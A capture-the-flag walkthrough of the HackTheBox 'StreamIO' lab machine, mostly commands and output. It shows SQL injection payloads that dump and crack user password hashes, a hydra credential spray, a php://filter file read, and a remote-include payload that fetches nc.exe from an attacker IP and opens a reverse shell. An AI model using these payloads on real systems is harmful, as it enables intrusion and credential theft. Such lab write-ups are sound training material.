# Scan

```bash
ghost@localhost [00:33:50] [~/Documents/hacking/hackthebox/streamio] [master]
-> % rustscan -a $IP -- -sC -sV -oA .

Open 10.10.11.158:53
Open 10.10.11.158:80
Open 10.10.11.158:88
Open 10.10.11.158:135
Open 10.10.11.158:139
Open 10.10.11.158:389
Open 10.10.11.158:443
Open 10.10.11.158:445
Open 10.10.11.158:464
Open 10.10.11.158:593
Open 10.10.11.158:636
Open 10.10.11.158:3268
Open 10.10.11.158:3269
Open 10.10.11.158:5985
Open 10.10.11.158:9389
Open 10.10.11.158:49667
Open 10.10.11.158:49674
Open 10.10.11.158:49673
Open 10.10.11.158:49704

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2022-12-01 23:37:12Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Issuer: commonName=streamIO/countryName=EU
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-02-22T07:03:28
| Not valid after:  2022-03-24T07:03:28
| MD5:   b99a2c8da0b8b10aeefabe204abdecaf
| SHA-1: 6c6a3f5c753661d52da60e6675c056ce56e4656d
| -----BEGIN CERTIFICATE-----
| MIIDYjCCAkqgAwIBAgIUbdDRZxR55nbfMxJzBHWVXcH83kQwDQYJKoZIhvcNAQEL
| BQAwIDELMAkGA1UEBhMCRVUxETAPBgNVBAMMCHN0cmVhbUlPMB4XDTIyMDIyMjA3
| MDMyOFoXDTIyMDMyNDA3MDMyOFowIDELMAkGA1UEBhMCRVUxETAPBgNVBAMMCHN0
| cmVhbUlPMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2QSO8noWDU+A
| MYuhSMrB2mA+V7W2gwMdTHxYK0ausnBHdfQ4yGgAs7SdyYKXf8fA502x4LvYwgmd
| 67QtQdYtsTSv63SlnEW3zjJyu/dRW0cwMfBCqyiLgAScrxb/6HOhpnOAzk0DdBWE
| 2vobsSSAh+cDHVSuSbEBLqJ0GEL4hcggHhQq6HLRmmrb0wGjL1WIwjQ8cCWcFzzw
| 5Xe3gEe+aHK245qZKrZtHuXelFe72/nbF8VFiukkaBMgoh6VfpM66nMzy+KeLfhP
| FkxBt6osGUHwSnocJknc7t+ySRVTACAMPjbbPGEl4hvNEcZpepep6jD6qgi4k7bL
| 82Nu2AeSIQIDAQABo4GTMIGQMB0GA1UdDgQWBBRf0ALWCgvVfRgijR2I0KY0uRjY
| djAfBgNVHSMEGDAWgBRf0ALWCgvVfRgijR2I0KY0uRjYdjAPBgNVHRMBAf8EBTAD
| AQH/MCsGA1UdEQQkMCKCDHN0cmVhbUlPLmh0YoISd2F0Y2guc3RyZWFtSU8uaHRi
| MBAGA1UdIAQJMAcwBQYDKgMEMA0GCSqGSIb3DQEBCwUAA4IBAQCCAFvDk/XXswL4
| cP6nH8MEkdEU7yvMOIPp+6kpgujJsb/Pj66v37w4f3us53dcoixgunFfRO/qAjtY
| PNWjebXttLHER+fet53Mu/U8bVQO5QD6ErSYUrzW/l3PNUFHIewpNg09gmkY4gXt
| oZzGN7kvjuKHm+lG0MunVzcJzJ3WcLHQUcwEWAdSGeAyKTfGNy882YTUiAC3p7HT
| 61PwCI+lO/OU52VlgnItRHH+yexBTLRB+Oa2UhB7GnntQOR1S5g497Cs3yAciST2
| JaKhcCnBY1cWqUSAm56QK3mz55BNPcOUHLhrFLjIaWRVx8Ro8QOCWcxkTfVcKcR+
| DSJTOJH8
|_-----END CERTIFICATE-----
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2022-12-01T23:38:46+00:00; +6h59m59s from scanner time.
|_http-title: Not Found
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49667/tcp open  msrpc         syn-ack Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         syn-ack Microsoft Windows RPC
49704/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 18376/tcp): CLEAN (Timeout)
|   Check 2 (port 49301/tcp): CLEAN (Timeout)
|   Check 3 (port 60672/udp): CLEAN (Timeout)
|   Check 4 (port 25119/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2022-12-01T23:38:11
|_  start_date: N/A
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m57s
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
```

Based on IIS version, it is running Windows 10 or Windows Server 2016.

```bash
ghost@localhost [00:35:37] [~/Documents/hacking/hackthebox/streamio] [master]
-> % curl -i 10.10.11.158
HTTP/1.1 200 OK
Content-Type: text/html
Last-Modified: Tue, 22 Feb 2022 10:46:01 GMT
Accept-Ranges: bytes
ETag: "b23de861d927d81:0"
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
Date: Thu, 01 Dec 2022 23:35:44 GMT
Content-Length: 703
```

With DNS (53, Kerberos 88, LDAP 389, SMB 445, RPC 135, Netbios 139 and etc), it is a domain controller.

Looking at port 443, there's a SSL certificate indicating domain `streamio.htb` and `watch.streanio.htb`.

I tried `wfuzz` to see if there are more sub-domains, but found nothing.

```bash
ghost@localhost [00:45:54] [~/Documents/hacking/hackthebox/streamio] [master *]
-> % wfuzz -c -f subdomains.txt -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "https://streamio.htb" -H "Host: FUZZ.streamio.htb" --hh 315
```

I tried `crackmapexec` but nothing interesting.

```bash
ghost@localhost [01:02:20] [~/Documents/hacking/hackthebox/streamio/crackmapexec] [master *]
-> % crackmapexec smb 10.10.11.158
SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
```



## streamio.htb

The website got nothing interesting. From homepage, it shows that it is running PHP.

```bash
ghost@localhost [01:04:06] [~/Documents/hacking/hackthebox/streamio] [master *]
-> % curl -i https://streamio.htb/index.php -k
HTTP/2 200
cache-control: no-store, no-cache, must-revalidate
pragma: no-cache
content-type: text/html; charset=UTF-8
expires: Thu, 19 Nov 1981 08:52:00 GMT
server: Microsoft-IIS/10.0
x-powered-by: PHP/7.2.26
set-cookie: PHPSESSID=8ofuaalto96ld8ojmq4tn295aq; path=/
x-powered-by: ASP.NET
date: Fri, 02 Dec 2022 00:04:12 GMT
content-length: 13497
```

It is powered by ASP.NET, so most likely default IIS. If I can upload `.aspx` webshell, I might get remote access.

I run feroxbuster to see if there's anything interesting.

```bash
ghost@localhost [01:06:04] [~/Documents/hacking/hackthebox/streamio] [master *]
-> % feroxbuster -u https://streamio.htb -x php -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

301      GET        2l       10w      151c https://streamio.htb/images => https://streamio.htb/images/
200      GET      395l      915w    13497c https://streamio.htb/
200      GET      206l      430w     6434c https://streamio.htb/contact.php
200      GET      231l      571w     7825c https://streamio.htb/about.php
200      GET      395l      915w    13497c https://streamio.htb/index.php
200      GET      111l      269w     4145c https://streamio.htb/login.php
200      GET      121l      291w     4500c https://streamio.htb/register.php
301      GET        2l       10w      151c https://streamio.htb/Images => https://streamio.htb/Images/
301      GET        2l       10w      150c https://streamio.htb/admin => https://streamio.htb/admin/
301      GET        2l       10w      157c https://streamio.htb/admin/images => https://streamio.htb/admin/images/
403      GET        1l        1w       18c https://streamio.htb/admin/index.php
301      GET        2l       10w      157c https://streamio.htb/admin/Images => https://streamio.htb/admin/Images/
301      GET        2l       10w      148c https://streamio.htb/css => https://streamio.htb/css/
200      GET      206l      430w     6434c https://streamio.htb/Contact.php
200      GET      231l      571w     7825c https://streamio.htb/About.php
200      GET      395l      915w    13497c https://streamio.htb/Index.php
200      GET      111l      269w     4145c https://streamio.htb/Login.php
301      GET        2l       10w      154c https://streamio.htb/admin/css => https://streamio.htb/admin/css/
301      GET        2l       10w      147c https://streamio.htb/js => https://streamio.htb/js/
403      GET        1l        1w       18c https://streamio.htb/admin/Index.php
302      GET        0l        0w        0c https://streamio.htb/logout.php => https://streamio.htb/
301      GET        2l       10w      153c https://streamio.htb/admin/js => https://streamio.htb/admin/js/
200      GET        2l        6w       58c https://streamio.htb/admin/master.php
```

### login.php

It does nothing. Even if I register, I cannot login.

### admin/index.php

Gives 403, forbidden.

### admin/master.php

It says *Only accessable through includes*.


## watch.streamio.htb

I run `feroxbuster` again.

```bash
ghost@localhost [01:08:47] [~/Documents/hacking/hackthebox/streamio] [master *]
-> % feroxbuster -u https://watch.streamio.htb -x php -k -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

200      GET       78l      245w     2829c https://watch.streamio.htb/
200      GET       78l      245w     2829c https://watch.streamio.htb/index.php
200      GET     7193l    19558w   253887c https://watch.streamio.htb/search.php
301      GET        2l       10w      157c https://watch.streamio.htb/static => https://watch.streamio.htb/static/
200      GET     7193l    19558w   253887c https://watch.streamio.htb/Search.php
200      GET       78l      245w     2829c https://watch.streamio.htb/Index.php
301      GET        2l       10w      161c https://watch.streamio.htb/static/css => https://watch.streamio.htb/static/css/
301      GET        2l       10w      160c https://watch.streamio.htb/static/js => https://watch.streamio.htb/static/js/
200      GET       78l      245w     2829c https://watch.streamio.htb/INDEX.php
301      GET        2l       10w      161c https://watch.streamio.htb/static/CSS => https://watch.streamio.htb/static/CSS/
301      GET        2l       10w      160c https://watch.streamio.htb/static/JS => https://watch.streamio.htb/static/JS/
200      GET       20l       47w      677c https://watch.streamio.htb/blocked.php
200      GET     7193l    19558w   253887c https://watch.streamio.htb/SEARCH.php
301      GET        2l       10w      157c https://watch.streamio.htb/Static => https://watch.streamio.htb/Static
```

### search.php

Entering `test` returns `The Greatest Showman`. So it is using wildcard (`*`) on both side. It is a POST request sending to the server. 

It is vulnerable to SQL injection. Query probably looks like below.

```SQL
select * from movies where title like '%[input]%';
```

So SQL injection is done below.

```SQL
abcd' union select 1,@@version,3,4,5,6; -- -'
-- ##### Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) Sep 24 2019 13:48:23 Copyright (C) 2019 Microsoft Corporation Express Edition (64-bit) on Windows Server 2019 Standard 10.0 (Build 17763: ) (Hypervisor)


abcd' union select 1,name,3,4,5,6 from master..sysdatabases; -- -'
-- master, model, msdb, STREAMIO, streamio_backup, tempdb


abcd' union select 1,name,id,4,5,6 from streamio..sysobjects where xtype='U'; -- -'
-- read about what is xtype, and mssql in general here
-- https://learn.microsoft.com/en-us/sql/relational-databases/system-compatibility-views/sys-sysobjects-transact-sql?view=sql-server-ver16
-- movies (885578193), users (901578250)


abcd' union select 1,name,id,4,5,6 from streamio..syscolumns where id in (885578193,901578250); -- -'
-- movies (885578193): id, imdb, metascore, movie, votes, year
-- users (901578250): id, is_staff, password, username

abcd' union select 1,concat('is_staff:', is_staff, ' - ', username, ':', password),3,4,5,6 from users; -- -'
/**
# admin
admin:665a50ac9eaa781e4f7f04199db97a11

# users
Alexendra:1c2b3d8270321140e5153f6637d3ee53
Austin:0049ac57646627b8d7aeaccf8b6a936f
Barbra:3961548825e3e21df5646cafe11c6c76
Barry:54c88b2dbd7b1a84012fabc1a4c73415
Baxter:22ee218331afd081b0dcd8115284bae3
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8
Carmon:35394484d89fcfdb3c5e447fe749d213
Clara:ef8f3d30a856cf166fb8215aca93e9ff
Diablo:ec33265e5fc8c2f1b0c137bb7b3632b5
Garfield:8097cedd612cc37c29db152b6e9edbd3
Gloria:0cfaaaafb559f081df2befbe66686de0
James:c660060492d9edcaa8332d89c99c9239
Juliette:6dcd87740abb64edfa36d170f0d5450d
Lauren:08344b85b329d7efd611b7a7743e8a09
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f
Lucifer:7df45a9e3de3863807c026ba48e55fb3
Michelle:b83439b16f844bd6ffe35c02fe21b3c0
Oliver:fd78db29173a5cf701bd69027cb9bf6b
Robert:f03b910e2bd0313a23fdd7575f34a694
Robin:dc332fb5576e9631c9dae83f194f8e70
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5
Samantha:083ffae904143c4796e464dac33c1f7d
Stan:384463526d288edcc95fc3701e523bc7
Thane:3577c47eb1e12c8ba021611e1280753c
Theodore:925e5408ecb67aea449373d668b7359e
Victor:bf55e15b119860a6e6b5a164377da719
Victoria:b22abb47a02b52d5dfa27fb0b534f693
William:d62be0dc82071bccc1322d64ec5b6c51
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332
**/

```

I crack passwords with hashcat.

```bash
ghost@localhost [02:00:25] [~/Documents/hacking/hackthebox/streamio] [master *]
-> % hashcat users-hashes.txt /usr/share/wordlists/rockyou.txt --user -m 0

ghost@localhost [02:00:49] [~/Documents/hacking/hackthebox/streamio] [master *]
-> % hashcat users-hashes.txt /usr/share/wordlists/rockyou.txt --user -m 0 --show
admin:665a50ac9eaa781e4f7f04199db97a11:paddpadd
Barry:54c88b2dbd7b1a84012fabc1a4c73415:$hadoW
Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8:$monique$1991$
Clara:ef8f3d30a856cf166fb8215aca93e9ff:%$clara
Juliette:6dcd87740abb64edfa36d170f0d5450d:$3xybitch
Lauren:08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##
Lenord:ee0b8a0937abd60c2882eacb2f8dc49f:physics69i
Michelle:b83439b16f844bd6ffe35c02fe21b3c0:!?Love?!123
Sabrina:f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$
Thane:3577c47eb1e12c8ba021611e1280753c:highschoolmusical
Victoria:b22abb47a02b52d5dfa27fb0b534f693:!5psycho8!
yoshihide:b779ba15cedfd22a023c4d8bcf5f2332:66boysandgirls..
```

Then I try all for SMB.

```bash
ghost@localhost [02:01:55] [~/Documents/hacking/hackthebox/streamio] [master *]
-> % cat credentials.txt | cut -d: -f1 > user

ghost@localhost [02:02:08] [~/Documents/hacking/hackthebox/streamio] [master *]
-> % cat credentials.txt | cut -d: -f3 > pass

ghost@localhost [02:03:17] [~/Documents/hacking/hackthebox/streamio] [master *]
-> % crackmapexec smb 10.10.11.158 -u user -p pass --no-bruteforce --continue-on-success
SMB         10.10.11.158    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:streamIO.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:paddpadd STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Barry:$hadoW STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Bruno:$monique$1991$ STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Clara:%$clara STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Juliette:$3xybitch STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Lauren:##123a8j8w5123## STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Lenord:physics69i STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Michelle:!?Love?!123 STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Sabrina:!!sabrina$ STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Thane:highschoolmusical STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\Victoria:!5psycho8! STATUS_LOGON_FAILURE
SMB         10.10.11.158    445    DC               [-] streamIO.htb\yoshihide:66boysandgirls.. STATUS_LOGON_FAILURE
```

Every credential failed. Then I try again in hydra.

```bash
ghost@localhost [02:05:07] [~/Documents/hacking/hackthebox/streamio] [master *]
-> % cat credentials.txt | cut -d: -f1,3 > userpass

ghost@localhost [02:05:43] [~/Documents/hacking/hackthebox/streamio] [master *]
-> % hydra -C userpass streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=failed"
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-12-02 02:06:19
[DATA] max 12 tasks per 1 server, overall 12 tasks, 12 login tries, ~1 try per task
[DATA] attacking http-post-forms://streamio.htb:443/login.php:username=^USER^&password=^PASS^:F=failed
[443][http-post-form] host: streamio.htb   login: yoshihide   password: 66boysandgirls..
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-12-02 02:06:27
```

`yoshihide:66boysandgirls..` works.

This time I can access `/admin`. So I look around and realised tabs are selected based on URL query param.

```bash
https://streamio.htb/admin/?user=
https://streamio.htb/admin/?staff=
https://streamio.htb/admin/?movie=
https://streamio.htb/admin/?message=
```

With Cookie copied from browser, I run `wfuzz` to look for other pages.

```bash
ghost@localhost [02:06:28] [~/Documents/hacking/hackthebox/streamio] [master *]
-> % wfuzz -u https://streamio.htb/admin/\?FUZZ\= -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -H "Cookie: PHPSESSID=r3jv1o64v0e04mgd3mpq5jhc4l" --hh 1678


```

https://streamio.htb/admin/?debug= shows just a message. If I try `debug=index.php`, gets error. Then I remember, during recon earlier, there's `/admin/master.php` which only works with include.

https://streamio.htb/admin/?debug=master.php seems to show all pages. I decided to download the `master.php` page.

https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php

Then decode the base64 to get back the page.

```
PGgxPk1vdmllIG1hbmFnbWVudDwvaDE+DQo8P3BocA0KaWYoIWRlZmluZWQoJ2luY2x1ZGVkJykpDQoJZGllKCJPbmx5IGFjY2Vzc2FibGUgdGhyb3VnaCBpbmNsdWRlcyIpOw0KaWYoaXNzZXQoJF9QT1NUWydtb3ZpZV9pZCddKSkNCnsNCiRxdWVyeSA9ICJkZWxldGUgZnJvbSBtb3ZpZXMgd2hlcmUgaWQgPSAiLiRfUE9TVFsnbW92aWVfaWQnXTsNCiRyZXMgPSBzcWxzcnZfcXVlcnkoJGhhbmRsZSwgJHF1ZXJ5LCBhcnJheSgpLCBhcnJheSgiU2Nyb2xsYWJsZSI9PiJidWZmZXJlZCIpKTsNCn0NCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIG1vdmllcyBvcmRlciBieSBtb3ZpZSI7DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp3aGlsZSgkcm93ID0gc3Fsc3J2X2ZldGNoX2FycmF5KCRyZXMsIFNRTFNSVl9GRVRDSF9BU1NPQykpDQp7DQo/Pg0KDQo8ZGl2Pg0KCTxkaXYgY2xhc3M9ImZvcm0tY29udHJvbCIgc3R5bGU9ImhlaWdodDogM3JlbTsiPg0KCQk8aDQgc3R5bGU9ImZsb2F0OmxlZnQ7Ij48P3BocCBlY2hvICRyb3dbJ21vdmllJ107ID8+PC9oND4NCgkJPGRpdiBzdHlsZT0iZmxvYXQ6cmlnaHQ7cGFkZGluZy1yaWdodDogMjVweDsiPg0KCQkJPGZvcm0gbWV0aG9kPSJQT1NUIiBhY3Rpb249Ij9tb3ZpZT0iPg0KCQkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9Im1vdmllX2lkIiB2YWx1ZT0iPD9waHAgZWNobyAkcm93WydpZCddOyA/PiI+DQoJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ0biBidG4tc20gYnRuLXByaW1hcnkiIHZhbHVlPSJEZWxldGUiPg0KCQkJPC9mb3JtPg0KCQk8L2Rpdj4NCgk8L2Rpdj4NCjwvZGl2Pg0KPD9waHANCn0gIyB3aGlsZSBlbmQNCj8+DQo8YnI+PGhyPjxicj4NCjxoMT5TdGFmZiBtYW5hZ21lbnQ8L2gxPg0KPD9waHANCmlmKCFkZWZpbmVkKCdpbmNsdWRlZCcpKQ0KCWRpZSgiT25seSBhY2Nlc3NhYmxlIHRocm91Z2ggaW5jbHVkZXMiKTsNCiRxdWVyeSA9ICJzZWxlY3QgKiBmcm9tIHVzZXJzIHdoZXJlIGlzX3N0YWZmID0gMSAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0KaWYoaXNzZXQoJF9QT1NUWydzdGFmZl9pZCddKSkNCnsNCj8+DQo8ZGl2IGNsYXNzPSJhbGVydCBhbGVydC1zdWNjZXNzIj4gTWVzc2FnZSBzZW50IHRvIGFkbWluaXN0cmF0b3I8L2Rpdj4NCjw/cGhwDQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDEiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0ic3RhZmZfaWQiIHZhbHVlPSI8P3BocCBlY2hvICRyb3dbJ2lkJ107ID8+Ij4NCgkJCQk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnRuIGJ0bi1zbSBidG4tcHJpbWFyeSIgdmFsdWU9IkRlbGV0ZSI+DQoJCQk8L2Zvcm0+DQoJCTwvZGl2Pg0KCTwvZGl2Pg0KPC9kaXY+DQo8P3BocA0KfSAjIHdoaWxlIGVuZA0KPz4NCjxicj48aHI+PGJyPg0KPGgxPlVzZXIgbWFuYWdtZW50PC9oMT4NCjw/cGhwDQppZighZGVmaW5lZCgnaW5jbHVkZWQnKSkNCglkaWUoIk9ubHkgYWNjZXNzYWJsZSB0aHJvdWdoIGluY2x1ZGVzIik7DQppZihpc3NldCgkX1BPU1RbJ3VzZXJfaWQnXSkpDQp7DQokcXVlcnkgPSAiZGVsZXRlIGZyb20gdXNlcnMgd2hlcmUgaXNfc3RhZmYgPSAwIGFuZCBpZCA9ICIuJF9QT1NUWyd1c2VyX2lkJ107DQokcmVzID0gc3Fsc3J2X3F1ZXJ5KCRoYW5kbGUsICRxdWVyeSwgYXJyYXkoKSwgYXJyYXkoIlNjcm9sbGFibGUiPT4iYnVmZmVyZWQiKSk7DQp9DQokcXVlcnkgPSAic2VsZWN0ICogZnJvbSB1c2VycyB3aGVyZSBpc19zdGFmZiA9IDAiOw0KJHJlcyA9IHNxbHNydl9xdWVyeSgkaGFuZGxlLCAkcXVlcnksIGFycmF5KCksIGFycmF5KCJTY3JvbGxhYmxlIj0+ImJ1ZmZlcmVkIikpOw0Kd2hpbGUoJHJvdyA9IHNxbHNydl9mZXRjaF9hcnJheSgkcmVzLCBTUUxTUlZfRkVUQ0hfQVNTT0MpKQ0Kew0KPz4NCg0KPGRpdj4NCgk8ZGl2IGNsYXNzPSJmb3JtLWNvbnRyb2wiIHN0eWxlPSJoZWlnaHQ6IDNyZW07Ij4NCgkJPGg0IHN0eWxlPSJmbG9hdDpsZWZ0OyI+PD9waHAgZWNobyAkcm93Wyd1c2VybmFtZSddOyA/PjwvaDQ+DQoJCTxkaXYgc3R5bGU9ImZsb2F0OnJpZ2h0O3BhZGRpbmctcmlnaHQ6IDI1cHg7Ij4NCgkJCTxmb3JtIG1ldGhvZD0iUE9TVCI+DQoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0idXNlcl9pZCIgdmFsdWU9Ijw/cGhwIGVjaG8gJHJvd1snaWQnXTsgPz4iPg0KCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJidG4gYnRuLXNtIGJ0bi1wcmltYXJ5IiB2YWx1ZT0iRGVsZXRlIj4NCgkJCTwvZm9ybT4NCgkJPC9kaXY+DQoJPC9kaXY+DQo8L2Rpdj4NCjw/cGhwDQp9ICMgd2hpbGUgZW5kDQo/Pg0KPGJyPjxocj48YnI+DQo8Zm9ybSBtZXRob2Q9IlBPU1QiPg0KPGlucHV0IG5hbWU9ImluY2x1ZGUiIGhpZGRlbj4NCjwvZm9ybT4NCjw/cGhwDQppZihpc3NldCgkX1BPU1RbJ2luY2x1ZGUnXSkpDQp7DQppZigkX1BPU1RbJ2luY2x1ZGUnXSAhPT0gImluZGV4LnBocCIgKSANCmV2YWwoZmlsZV9nZXRfY29udGVudHMoJF9QT1NUWydpbmNsdWRlJ10pKTsNCmVsc2UNCmVjaG8oIiAtLS0tIEVSUk9SIC0tLS0gIik7DQp9DQo/Pg==
```

Decode as below.

```bash
ghost@localhost [02:15:37] [~/Documents/hacking/hackthebox/streamio] [master *]
-> % echo -n "PGgxP...Qo/Pg==" | base64 --decode > master.php
```

At the bottom of the code, this is interesting.

```bash
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" )
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```

If there's `include` in POST body, if it is not `index.php` pass to `eval`, which is basically an execution.

I hosted `shell.php` and use POSTMAN to call https://streamio.htb/admin/?debug=master.php with `include:http://10.10.14.11/shell.php` in body.

I wrote the following in `shell.php`

```PHP
system("powershell -c wget 10.10.14.6/nc.exe -outfile \\programdata\\nc.exe");
system("\\programdata\\nc.exe -e powershell 10.10.14.11 4444");
```

Receives reverse shell.

```bash
ghost@localhost [02:24:55] [~/Documents/hacking/hackthebox/streamio] [master *]
-> % nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.11.158] 58280
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\streamio.htb\admin> 
```

Looking around found database credentials at `search.php` in watch.streamio.htb.

```bash
PS C:\inetpub\watch.streamio.htb> type search.php
...

$connection = array("Database"=>"STREAMIO", "UID" => "db_user", "PWD" => 'B1@hB1@hB1@h');
```

This time I try to access `streamio_backup` db.

```bash
PS C:\inetpub\watch.streamio.htb> sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select table_name from streamio_backup.information_schema.tables;"
table_name
--------------------------------------------------------------------------------------------------------------------------------
movies
users

(2 rows affected)
PS C:\inetpub\watch.streamio.htb> sqlcmd -S localhost -U db_admin -P B1@hx31234567890 -d streamio_backup -Q "select * from users;"
id          username                                           password
----------- -------------------------------------------------- --------------------------------------------------
          1 nikk37                                             389d14cb8e4e9b94b137deb1caf0612a
          2 yoshihide                                          b779ba15cedfd22a023c4d8bcf5f2332
          3 James                                              c660060492d9edcaa8332d89c99c9239
          4 Theodore                                           925e5408ecb67aea449373d668b7359e
          5 Samantha                                           083ffae904143c4796e464dac33c1f7d
          6 Lauren                                             08344b85b329d7efd611b7a7743e8a09
          7 William                                            d62be0dc82071bccc1322d64ec5b6c51
          8 Sabrina                                            f87d3c0d6c8fd686aacc6627f1f493a5

(8 rows affected)
```

So I crack those users again.

```bash
ghost@localhost [02:50:44] [~/Documents/hacking/hackthebox/streamio] [master *]
-> % hashcat users-hashes-backup.txt /usr/share/wordlists/rockyou.txt --user -m 0

ghost@localhost [02:50:44] [~/Documents/hacking/hackthebox/streamio] [master *]
-> % hashcat users-hashes-backup.txt /usr/share/wordlists/rockyou.txt --user -m 0 --show
